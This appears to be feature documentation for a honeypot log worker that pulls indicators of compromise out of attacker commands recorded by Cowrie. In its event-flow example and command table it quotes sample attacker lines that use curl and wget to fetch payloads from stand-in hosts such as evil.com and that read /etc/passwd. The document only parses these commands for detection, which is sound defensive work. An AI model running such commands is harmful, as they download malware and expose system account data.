# Feature 7: Cowrie Worker Integration

## Overview
Integrated IOC scanner into Cowrie worker to automatically extract indicators from attacker commands.

## Changes Made

### 1. Enhanced Worker (`src/workers/cowrie_ingest.py`)
- Added `scan_for_iocs()` inline function
- On `command` event: extract and store IOCs
- On `download` event: scan URL for IPs/hashes

### 2. Event Flow
```
Cowrie Log → Worker → Extract IOCs → API /ioc/store → DB Persistence

Example:
attacker$ cat /etc/passwd; curl http://malware.com/payload.exe
                                           ↓
                        IOCs extracted: [url: malware.com, ip: 1.2.3.4]
                                           ↓
                   POST /ioc/store with session_id + attacker_ip
```

## IOC Extraction in Commands

| Command | IOCs Extracted |
|---------|-----------------|
| `wget http://evil.com/shell.sh` | URL, IP if embedded |
| `sha256sum malware.exe` | SHA256 hash if output |
| `cat /etc/passwd` | None (but flagged) |
| `./exploit.sh` | None (but suspicious) |

## Safety Measures
- No command execution - only parsing
- IOC values sent as strings, not executed
- Session context preserved for forensics

## Tests
- `test_cowrie_ingest.py` - 8 tests for log parsing
- Integration tested with sample Cowrie logs